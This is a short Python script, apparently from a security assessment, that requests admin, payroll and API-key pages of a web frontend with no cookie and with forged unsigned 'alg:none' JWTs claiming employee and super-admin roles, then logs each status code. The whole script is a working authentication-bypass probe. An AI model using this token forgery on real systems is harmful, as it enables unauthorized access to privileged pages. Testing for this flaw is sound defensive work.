import sys, base64, json, time, requests
sys.path.insert(0, ".")
from plib import *
L = Log("NU-SEC-GATE-A05-fe-admin-gating")
def b64(d): return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
def tok(roles, alg="none"):
    return f"{b64(json.dumps({'alg':alg}).encode())}.{b64(json.dumps({'sub':'x','roles':roles,'role':roles[0],'exp':int(time.time())+3600}).encode())}.x"
for path in ("/admin/users", "/admin/roles", "/payroll/runs", "/settings/security/api-keys", "/dashboard", "/me/dashboard"):
    r0 = requests.get(FE + path, allow_redirects=False, timeout=30)
    L.w(f"FE GET {path} no cookie -> {r0.status_code} loc={r0.headers.get('location')}")
    r1 = requests.get(FE + path, headers={"Cookie": f"access_token={tok(['EMPLOYEE'])}"}, allow_redirects=False, timeout=30)
    L.w(f"FE GET {path} forged unsigned JWT roles=[EMPLOYEE] -> {r1.status_code} loc={r1.headers.get('location')}")
    r2 = requests.get(FE + path, headers={"Cookie": f"access_token={tok(['SUPER_ADMIN'])}"}, allow_redirects=False, timeout=30)
    L.w(f"FE GET {path} forged UNSIGNED JWT roles=[SUPER_ADMIN] -> {r2.status_code} loc={r2.headers.get('location')} (200 = SSR shell served on unverified token; API still enforces)")
